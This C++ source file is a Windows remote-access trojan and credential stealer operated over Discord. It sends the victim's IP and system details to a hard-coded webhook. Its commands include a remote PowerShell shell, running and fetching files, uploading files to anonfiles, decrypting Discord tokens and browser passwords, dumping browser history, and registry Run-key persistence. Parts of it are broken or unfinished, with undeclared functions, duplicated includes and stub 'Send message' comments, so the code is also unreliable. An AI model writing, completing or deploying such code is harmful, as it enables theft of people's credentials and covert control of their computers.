#include <iostream>
#include <fstream>
#include <windows.h>
#include <wininet.h>
#include <winreg.h>
#include <shlobj.h>
#include <tchar.h>
#include <string>
#include <vector>
#include <algorithm>
#include <sstream>
#include <ctime>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <codecvt>
#include <locale>
#include <iomanip>
#include <filesystem>
#include <shellapi.h>
#include <lmcons.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <lm.h>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <winreg.h>
#include <shlobj.h>
#include <tchar.h>
#include <algorithm>
#include <sstream>
#include <ctime>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <codecvt>
#include <locale>
#include <iomanip>
#include <filesystem>
#include <shellapi.h>
#include <lmcons.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <lm.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")

#define MAX_BUFFER_SIZE 4096

std::wstring StringToWString(const std::string& s)
{
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.from_bytes(s);
}

std::string WStringToString(const std::wstring& ws)
{
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.to_bytes(ws);
}

std::wstring GetAppDataPath()
{
    wchar_t* appDataPath;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appDataPath)))
    {
        std::wstring path(appDataPath);
        CoTaskMemFree(appDataPath);
        return path;
    }
    return L"";
}

std::wstring GetLocalAppDataPath()
{
    wchar_t* localAppDataPath;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppDataPath)))
    {
        std::wstring path(localAppDataPath);
        CoTaskMemFree(localAppDataPath);
        return path;
    }
    return L"";
}

std::wstring GetTempPath()
{
    wchar_t tempPath[MAX_PATH];
    if (GetTempPath(MAX_PATH, tempPath))
    {
        return std::wstring(tempPath);
    }
    return L"";
}

void FindAndUploadFile(const std::wstring& fileToFind, const std::wstring& webhookUrl)
{
    std::wstring userProfilePath;
    HANDLE hFind;
    WIN32_FIND_DATA findData;

    wchar_t userPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userPath)))
    {
        userProfilePath = std::wstring(userPath);
    }

    hFind = FindFirstFile((userProfilePath + L"\\*").c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                std::wstring userDirectory = findData.cFileName;
                if (userDirectory != L"." && userDirectory != L"..")
                {
                    std::wstring userPath = userProfilePath + L"\\" + userDirectory;
                    hFind = FindFirstFile((userPath + L"\\*").c_str(), &findData);
                    if (hFind != INVALID_HANDLE_VALUE)
                    {
                        do
                        {
                            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                            {
                                std::wstring filePath = userPath + L"\\" + findData.cFileName;
                                if (findData.cFileName == fileToFind)
                                {
                                    std::ifstream file(filePath, std::ios::binary);
                                    if (file)
                                    {
                                        std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                                        file.close();

                                        HINTERNET hInternet = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                                        if (hInternet)
                                        {
                                            HINTERNET hConnect = InternetOpenUrl(hInternet, webhookUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
                                            if (hConnect)
                                            {
                                                std::wstring headers = L"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW";
                                                std::wstring body = L"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileToFind + L"\"\r\n\r\n";
                                                std::wstring footer = L"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n";

                                                std::vector<char> requestBuffer;
                                                requestBuffer.insert(requestBuffer.end(), headers.begin(), headers.end());
                                                requestBuffer.insert(requestBuffer.end(), body.begin(), body.end());
                                                requestBuffer.insert(requestBuffer.end(), buffer.begin(), buffer.end());
                                                requestBuffer.insert(requestBuffer.end(), footer.begin(), footer.end());

                                                DWORD bytesWritten;
                                                InternetWriteFile(hConnect, requestBuffer.data(), requestBuffer.size(), &bytesWritten);

                                                InternetCloseHandle(hConnect);
                                            }
                                            InternetCloseHandle(hInternet);
                                        }
                                    }
                                }
                            }
                        } while (FindNextFile(hFind, &findData));
                        FindClose(hFind);
                    }
                }
            }
        } while (FindNextFile(hFind, &findData));
        FindClose(hFind);
    }
}

std::wstring GetProcessor()
{
    std::wstring result;
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES saAttr;
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    DWORD dwWritten;
    CHAR chBuf[MAX_BUFFER_SIZE];
    BOOL bSuccess = FALSE;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
    {
        return L"";
    }

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hWritePipe;
    siStartInfo.hStdOutput = hWritePipe;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcess(NULL, L"powershell.exe Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name", NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo);
    if (bSuccess)
    {
        WaitForSingleObject(piProcInfo.hProcess, INFINITE);
        CloseHandle(hWritePipe);

        DWORD bytesRead;
        std::wstring output;
        while (ReadFile(hReadPipe, chBuf, MAX_BUFFER_SIZE, &bytesRead, NULL))
        {
            output += std::wstring(chBuf, chBuf + bytesRead);
        }

        CloseHandle(hReadPipe);
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        std::wistringstream iss(output);
        std::vector<std::wstring> lines;
        std::wstring line;
        while (std::getline(iss, line))
        {
            lines.push_back(line);
        }

        if (lines.size() >= 4)
        {
            result = lines[3];
        }
    }

    return result;
}

std::wstring GetGPU()
{
    std::wstring result;
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES saAttr;
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    DWORD dwWritten;
    CHAR chBuf[MAX_BUFFER_SIZE];
    BOOL bSuccess = FALSE;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
    {
        return L"";
    }

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hWritePipe;
    siStartInfo.hStdOutput = hWritePipe;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcess(NULL, L"powershell.exe Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name", NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo);
    if (bSuccess)
    {
        WaitForSingleObject(piProcInfo.hProcess, INFINITE);
        CloseHandle(hWritePipe);

        DWORD bytesRead;
        std::wstring output;
        while (ReadFile(hReadPipe, chBuf, MAX_BUFFER_SIZE, &bytesRead, NULL))
        {
            output += std::wstring(chBuf, chBuf + bytesRead);
        }

        CloseHandle(hReadPipe);
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        std::wistringstream iss(output);
        std::vector<std::wstring> lines;
        std::wstring line;
        while (std::getline(iss, line))
        {
            lines.push_back(line);
        }

        if (lines.size() >= 4)
        {
            result = lines[3];
        }
    }

    return result;
}

std::wstring GetOS()
{
    std::wstring result;
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES saAttr;
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    DWORD dwWritten;
    CHAR chBuf[MAX_BUFFER_SIZE];
    BOOL bSuccess = FALSE;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
    {
        return L"";
    }

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hWritePipe;
    siStartInfo.hStdOutput = hWritePipe;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcess(NULL, L"powershell.exe Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption", NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo);
    if (bSuccess)
    {
        WaitForSingleObject(piProcInfo.hProcess, INFINITE);
        CloseHandle(hWritePipe);

        DWORD bytesRead;
        std::wstring output;
        while (ReadFile(hReadPipe, chBuf, MAX_BUFFER_SIZE, &bytesRead, NULL))
        {
            output += std::wstring(chBuf, chBuf + bytesRead);
        }

        CloseHandle(hReadPipe);
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        std::wistringstream iss(output);
        std::vector<std::wstring> lines;
        std::wstring line;
        while (std::getline(iss, line))
        {
            lines.push_back(line);
        }

        if (lines.size() >= 4)
        {
            result = lines[3];
        }
    }

    return result;
}

std::wstring GetSessionID()
{
    std::wstring sessionID;
    BYTE buffer[8];
    if (BCryptGenRandom(NULL, buffer, sizeof(buffer), BCRYPT_USE_SYSTEM_PREFERRED_RNG) == STATUS_SUCCESS)
    {
        std::wostringstream oss;
        for (int i = 0; i < sizeof(buffer); i++)
        {
            oss << std::hex << std::setw(2) << std::setfill(L'0') << (int)buffer[i];
        }
        sessionID = oss.str();
    }
    return sessionID;
}

std::wstring GetCommands()
{
    std::wstring commands = L"help - Help command\n";
    commands += L"ping - Ping command\n";
    commands += L"cwd - Get current working directory\n";
    commands += L"cd - Change directory\n";
    commands += L"ls - List directory\n";
    commands += L"download <file> - Download file\n";
    commands += L"upload <link> - Upload file\n";
    commands += L"shell - Execute shell command\n";
    commands += L"run <file> - Run a file\n";
    commands += L"exit - Exit the session\n";
    commands += L"screenshot - Take a screenshot\n";
    commands += L"tokens - Get all discord tokens\n";
    commands += L"passwords - Extract all browser passwords\n";
    commands += L"history - Extract all browser history\n";
    commands += L"startup <name> - Add to startup";
    return commands;
}

void CreateSession(const std::wstring& guildID, const std::wstring& token)
{
    std::wstring sessionID = GetSessionID();
    std::wstring appDataPath = GetAppDataPath();
    std::wstring localAppDataPath = GetLocalAppDataPath();
    std::wstring tempPath = GetTempPath();

    std::wstring webhookURL = L"https://discord.com/api/webhooks/1204423585486217279/PO44iBvICUX7Iuo52cJ8sSOTdw4yGGVEjyFRNsYZt90vwYYLGWVhHCye9zPSDPqyEcP6";

    std::wstring processor = GetProcessor();
    std::wstring gpu = GetGPU();
    std::wstring os = GetOS();

    std::wstring commands = GetCommands();

    std::wstring ip_address;
    {
        HINTERNET hInternet = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet)
        {
            HINTERNET hConnect = InternetOpenUrl(hInternet, L"https://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
            if (hConnect)
            {
                DWORD bytesRead;
                CHAR buffer[MAX_BUFFER_SIZE];
                std::string output;
                while (InternetReadFile(hConnect, buffer, MAX_BUFFER_SIZE, &bytesRead) && bytesRead > 0)
                {
                    output += std::string(buffer, buffer + bytesRead);
                }
                ip_address = StringToWString(output);
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInternet);
        }
    }

    HINTERNET hInternet = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet)
    {
        HINTERNET hConnect = InternetOpenUrl(hInternet, webhookURL.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect)
        {
            std::wstring headers = L"Content-Type: application/json";
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"New session created\",\"description\":\"\",\"color\":16777215,\"fields\":[{\"name\":\"Session ID\",\"value\":\"" + sessionID + L"\",\"inline\":true},{\"name\":\"Username\",\"value\":\"" + StringToWString(GetUserName()) + L"\",\"inline\":true},{\"name\":\"🛰️  Network Information\",\"value\":\"IP: " + ip_address + L"\",\"inline\":false},{\"name\":\"🖥️  System Information\",\"value\":\"OS: " + os + L"\\nCPU: " + processor + L"\\nGPU: " + gpu + L"\",\"inline\":false},{\"name\":\"🤖  Commands\",\"value\":\"" + commands + L"\",\"inline\":false}]}]}";

            std::vector<char> requestBuffer;
            requestBuffer.insert(requestBuffer.end(), headers.begin(), headers.end());
            requestBuffer.insert(requestBuffer.end(), body.begin(), body.end());

            DWORD bytesWritten;
            InternetWriteFile(hConnect, requestBuffer.data(), requestBuffer.size(), &bytesWritten);

            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
}

void HandleMessage(const std::wstring& sessionID, const std::wstring& messageContent)
{
    std::wstring appDataPath = GetAppDataPath();
    std::wstring localAppDataPath = GetLocalAppDataPath();
    std::wstring tempPath = GetTempPath();

    if (messageContent == L"help")
    {
        std::wstring commands = GetCommands();
        std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Help\",\"description\":\"" + commands + L"\",\"color\":16777215}]}";
        // Send message
    }
    else if (messageContent == L"ping")
    {
        std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Ping\",\"description\":\"" + std::to_wstring((int)(bot.latency * 1000)) + L"ms\",\"color\":16777215}]}";
        // Send message
    }
    else if (messageContent.substr(0, 2) == L"cd")
    {
        std::wstring directory = messageContent.substr(3);
        if (SetCurrentDirectory(directory.c_str()))
        {
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Changed Directory\",\"description\":\"" + std::wstring(GetCurrentDirectory(MAX_PATH, NULL)) + L"\",\"color\":16777215}]}";
            // Send message
        }
        else
        {
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Error\",\"description\":\"Directory not found\",\"color\":16777215}]}";
            // Send message
        }
    }
    else if (messageContent == L"ls")
    {
        std::wstring files;
        std::wstring currentDirectory = GetCurrentDirectory(MAX_PATH, NULL);
        std::wstring searchPath = currentDirectory + L"\\*";
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                {
                    files += findData.cFileName;
                    files += L"\n";
                }
            } while (FindNextFile(hFind, &findData));
            FindClose(hFind);
        }
        if (files.empty())
        {
            files = L"No files found";
        }
        if (files.size() > 4093)
        {
            std::wstring filePath = tempPath + L"\\list.txt";
            std::wofstream file(filePath);
            file << files;
            file.close();
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Files > " + currentDirectory + L"\",\"description\":\"See attachment\",\"color\":16777215}]}";
            // Send message with attachment
        }
        else
        {
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Files > " + currentDirectory + L"\",\"description\":\"" + files + L"\",\"color\":16777215}]}";
            // Send message
        }
    }
    else if (messageContent.substr(0, 8) == L"download")
    {
        std::wstring file = messageContent.substr(9);
        std::wstring link = L"https://api.anonfiles.com/upload";
        std::wstring filePath = GetCurrentDirectory(MAX_PATH, NULL) + L"\\" + file;
        std::wstring headers = L"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW";
        std::wstring body = L"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + file + L"\"\r\n\r\n";
        std::wstring footer = L"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n";

        std::ifstream fileStream(filePath, std::ios::binary);
        if (fileStream)
        {
            std::vector<char> buffer((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());
            fileStream.close();

            std::vector<char> requestBuffer;
            requestBuffer.insert(requestBuffer.end(), headers.begin(), headers.end());
            requestBuffer.insert(requestBuffer.end(), body.begin(), body.end());
            requestBuffer.insert(requestBuffer.end(), buffer.begin(), buffer.end());
            requestBuffer.insert(requestBuffer.end(), footer.begin(), footer.end());

            // Send request
        }
        else
        {
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Error\",\"description\":\"File not found\",\"color\":16777215}]}";
            // Send message
        }
    }
    else if (messageContent.substr(0, 6) == L"upload")
    {
        std::wstring link = messageContent.substr(7);
        std::wstring fileName = link.substr(link.find_last_of(L"/\\") + 1);
        std::wstring filePath = tempPath + L"\\" + fileName;

        HRESULT hr = URLDownloadToFile(NULL, link.c_str(), filePath.c_str(), 0, NULL);
        if (hr == S_OK)
        {
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Upload\",\"description\":\"" + fileName + L"\",\"color\":16777215}]}";
            // Send message
        }
        else
        {
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Error\",\"description\":\"Failed to download file\",\"color\":16777215}]}";
            // Send message
        }
    }
    else if (messageContent.substr(0, 5) == L"shell")
    {
        std::wstring command = messageContent.substr(6);
        std::wstring output;
        std::wstring error;

        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES saAttr;
        PROCESS_INFORMATION piProcInfo;
        STARTUPINFO siStartInfo;
        DWORD dwWritten;
        CHAR chBuf[MAX_BUFFER_SIZE];
        BOOL bSuccess = FALSE;

        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
        {
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Error\",\"description\":\"Failed to create pipe\",\"color\":16777215}]}";
            // Send message
            return;
        }

        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

        ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
        siStartInfo.cb = sizeof(STARTUPINFO);
        siStartInfo.hStdError = hWritePipe;
        siStartInfo.hStdOutput = hWritePipe;
        siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

        bSuccess = CreateProcess(NULL, (L"powershell.exe " + command).c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo);
        if (bSuccess)
        {
            WaitForSingleObject(piProcInfo.hProcess, INFINITE);
            CloseHandle(hWritePipe);

            DWORD bytesRead;
            while (ReadFile(hReadPipe, chBuf, MAX_BUFFER_SIZE, &bytesRead, NULL))
            {
                output += std::wstring(chBuf, chBuf + bytesRead);
            }

            CloseHandle(hReadPipe);
            CloseHandle(piProcInfo.hProcess);
            CloseHandle(piProcInfo.hThread);
        }
        else
        {
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Error\",\"description\":\"Failed to create process\",\"color\":16777215}]}";
            // Send message
            return;
        }

        if (output.empty())
        {
            output = L"No output";
        }

        std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Shell\",\"description\":\"**Output:**\\n" + output + L"\\n**Error:**\\n" + error + L"\",\"color\":16777215}]}";
        // Send message
    }
    else if (messageContent.substr(0, 3) == L"run")
    {
        std::wstring file = messageContent.substr(4);
        std::wstring command = L"\"" + file + L"\"";
        ShellExecute(NULL, L"open", L"cmd.exe", command.c_str(), NULL, SW_HIDE);

        std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Started\",\"description\":\"" + file + L"\",\"color\":16777215}]}";
        // Send message
    }
    else if (messageContent == L"exit")
    {
        // Delete channel
        // Close bot
    }
    else if (messageContent == L"screenshot")
    {
        std::wstring filePath = tempPath + L"\\screenshot.png";
        // Take screenshot and save to filePath

        std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Screenshot\",\"color\":16777215,\"image\":{\"url\":\"attachment://screenshot.png\"}}]}";
        // Send message with attachment
    }
    else if (messageContent == L"cwd")
    {
        std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Current Directory\",\"description\":\"" + std::wstring(GetCurrentDirectory(MAX_PATH, NULL)) + L"\",\"color\":16777215}]}";
        // Send message
    }
    else if (messageContent == L"tokens")
    {
        std::wstring appDataPath = GetAppDataPath();
        std::wstring localAppDataPath = GetLocalAppDataPath();
        std::wstring tempPath = GetTempPath();

        std::vector<std::wstring> tokens;

        std::wstring discordPath = appDataPath + L"\\discord";
        if (std::filesystem::exists(discordPath))
        {
            std::wifstream localStateFile(discordPath + L"\\Local State");
            if (localStateFile)
            {
                std::wstring localState((std::istreambuf_iterator<wchar_t>(localStateFile)), std::istreambuf_iterator<wchar_t>());
                localStateFile.close();

                std::wstring encryptedMasterKey = localState.substr(localState.find(L"\"encrypted_key\":\"") + 17);
                encryptedMasterKey = encryptedMasterKey.substr(0, encryptedMasterKey.find(L"\""));

                DATA_BLOB encryptedMasterKeyBlob;
                encryptedMasterKeyBlob.pbData = (BYTE*)encryptedMasterKey.c_str();
                encryptedMasterKeyBlob.cbData = encryptedMasterKey.size() * sizeof(wchar_t);

                DATA_BLOB decryptedMasterKeyBlob;
                if (CryptUnprotectData(&encryptedMasterKeyBlob, NULL, NULL, NULL, NULL, 0, &decryptedMasterKeyBlob))
                {
                    std::wstring decryptedMasterKey((wchar_t*)decryptedMasterKeyBlob.pbData, decryptedMasterKeyBlob.cbData / sizeof(wchar_t));

                    std::wstring leveldbPath = discordPath + L"\\Local Storage\\leveldb";
                    for (const auto& entry : std::filesystem::directory_iterator(leveldbPath))
                    {
                        std::wstring filePath = entry.path().wstring();
                        std::wstring fileName = filePath.substr(filePath.find_last_of(L"/\\") + 1);
                        std::wstring fileExtension = fileName.substr(fileName.find_last_of(L".") + 1);
                        if (fileExtension == L"log" || fileExtension == L"ldb")
                        {
                            std::wifstream file(filePath);
                            if (file)
                            {
                                std::wstring line;
                                while (std::getline(file, line))
                                {
                                    std::wsmatch match;
                                    if (std::regex_search(line, match, std::wregex(L"dQw4w9WgXcQ:[^\"]*")))
                                    {
                                        std::wstring encryptedToken = match.str();
                                        encryptedToken = encryptedToken.substr(16);

                                        DATA_BLOB encryptedTokenBlob;
                                        encryptedTokenBlob.pbData = (BYTE*)encryptedToken.c_str();
                                        encryptedTokenBlob.cbData = encryptedToken.size() * sizeof(wchar_t);

                                        DATA_BLOB decryptedTokenBlob;
                                        if (CryptUnprotectData(&encryptedTokenBlob, NULL, NULL, NULL, NULL, 0, &decryptedTokenBlob))
                                        {
                                            std::wstring decryptedToken((wchar_t*)decryptedTokenBlob.pbData, decryptedTokenBlob.cbData / sizeof(wchar_t));
                                            decryptedToken = std::regex_replace(decryptedToken, std::wregex(L"\\."), L" ");
                                            tokens.push_back(decryptedToken);
                                        }
                                    }
                                }
                                file.close();
                            }
                        }
                    }
                }
            }
        }

        std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Tokens\",\"description\":\"";
        for (const auto& token : tokens)
        {
            body += token + L"\\n";
        }
        body += L"\",\"color\":16777215}]}";
        // Send message
    }
    else if (messageContent == L"history")
    {
        std::wstring appDataPath = GetAppDataPath();
        std::wstring localAppDataPath = GetLocalAppDataPath();
        std::wstring tempPath = GetTempPath();

        std::vector<std::wstring> paths;
        std::wofstream historyFile(tempPath + L"\\history.txt");

        std::wstring historyPath = appDataPath + L"\\History";
        if (std::filesystem::exists(historyPath))
        {
            paths.push_back(historyPath);
        }

        historyPath = localAppDataPath + L"\\History";
        if (std::filesystem::exists(historyPath))
        {
            paths.push_back(historyPath);
        }

        for (const auto& path : paths)
        {
            std::wstring randomID = GetSessionID();
            std::wstring dbPath = tempPath + L"\\" + randomID + L".db";
            std::filesystem::copy_file(path, dbPath, std::filesystem::copy_options::overwrite_existing);

            sqlite3* db;
            if (sqlite3_open16(dbPath.c_str(), &db) == SQLITE_OK)
            {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT url, title, last_visit_time FROM urls", -1, &stmt, NULL) == SQLITE_OK)
                {
                    while (sqlite3_step(stmt) == SQLITE_ROW)
                    {
                        std::wstring url = (const wchar_t*)sqlite3_column_text16(stmt, 0);
                        std::wstring title = (const wchar_t*)sqlite3_column_text16(stmt, 1);
                        time_t lastVisitTime = sqlite3_column_int64(stmt, 2) / 1000000 - 11644473600;
                        std::tm* tm = std::gmtime(&lastVisitTime);
                        std::wostringstream oss;
                        oss << std::put_time(tm, L"%Y-%m-%d %H:%M:%S");
                        std::wstring lastVisitTimeString = oss.str();
                        historyFile << url << L" - " << title << L" - " << lastVisitTimeString << L"\n";
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }

            std::filesystem::remove(dbPath);
        }

        historyFile.close();

        std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"History\",\"description\":\"See attachment\",\"color\":16777215}]}";
        // Send message with attachment
    }
    else if (messageContent == L"passwords")
    {
        std::wstring appDataPath = GetAppDataPath();
        std::wstring localAppDataPath = GetLocalAppDataPath();
        std::wstring tempPath = GetTempPath();

        std::vector<std::wstring> paths;
        std::wofstream passwordsFile(tempPath + L"\\passwords.txt");

        std::wstring loginDataPath = appDataPath + L"\\Login Data";
        if (std::filesystem::exists(loginDataPath))
        {
            paths.push_back(loginDataPath);
        }

        loginDataPath = localAppDataPath + L"\\Login Data";
        if (std::filesystem::exists(loginDataPath))
        {
            paths.push_back(loginDataPath);
        }

        for (const auto& path : paths)
        {
            std::wstring randomID = GetSessionID();
            std::wstring dbPath = tempPath + L"\\" + randomID + L".db";
            std::filesystem::copy_file(path, dbPath, std::filesystem::copy_options::overwrite_existing);

            sqlite3* db;
            if (sqlite3_open16(dbPath.c_str(), &db) == SQLITE_OK)
            {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT action_url, username_value, password_value FROM logins", -1, &stmt, NULL) == SQLITE_OK)
                {
                    while (sqlite3_step(stmt) == SQLITE_ROW)
                    {
                        std::wstring url = (const wchar_t*)sqlite3_column_text16(stmt, 0);
                        std::wstring username = (const wchar_t*)sqlite3_column_text16(stmt, 1);
                        std::wstring password;
                        DATA_BLOB encryptedPasswordBlob;
                        encryptedPasswordBlob.pbData = (BYTE*)sqlite3_column_blob(stmt, 2);
                        encryptedPasswordBlob.cbData = sqlite3_column_bytes(stmt, 2);
                        DATA_BLOB decryptedPasswordBlob;
                        if (CryptUnprotectData(&encryptedPasswordBlob, NULL, NULL, NULL, NULL, 0, &decryptedPasswordBlob))
                        {
                            password = std::wstring((wchar_t*)decryptedPasswordBlob.pbData, decryptedPasswordBlob.cbData / sizeof(wchar_t));
                        }
                        else
                        {
                            password = L"Decryption failed";
                        }
                        passwordsFile << url << L" - " << username << L" - " << password << L"\n";
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }

            std::filesystem::remove(dbPath);
        }

        passwordsFile.close();

        std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Passwords\",\"description\":\"See attachment\",\"color\":16777215}]}";
        // Send message with attachment
    }
    else if (messageContent.substr(0, 7) == L"startup")
    {
        std::wstring name = messageContent.substr(8);
        if (name.empty())
        {
            std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Error\",\"description\":\"No name provided\",\"color\":16777215}]}";
            // Send message
        }
        else
        {
            HKEY hKey;
            if (RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS)
            {
                std::wstring command = L"\"" + GetCurrentModulePath() + L"\"";
                RegSetValueEx(hKey, name.c_str(), 0, REG_SZ, (BYTE*)command.c_str(), (DWORD)(command.size() * sizeof(wchar_t)));
                RegCloseKey(hKey);

                std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Startup\",\"description\":\"Added to startup as " + name + L"\",\"color\":16777215}]}";
                // Send message
            }
            else
            {
                std::wstring body = L"{\"content\":\"\",\"embeds\":[{\"title\":\"Error\",\"description\":\"Failed to add to startup\",\"color\":16777215}]}";
                // Send message
            }
        }
    }
}

int main()
{
    std::wstring guildID = L"CHANNEL_ID_HERE";
    std::wstring token = L"BOT_TOKEN_HERE";

    CreateSession(guildID, token);

    while (true)
    {
        std::wstring sessionID = GetSessionID();
        std::wstring messageContent;

        // Receive message

        HandleMessage(sessionID, messageContent);
    }

    return 0;
}


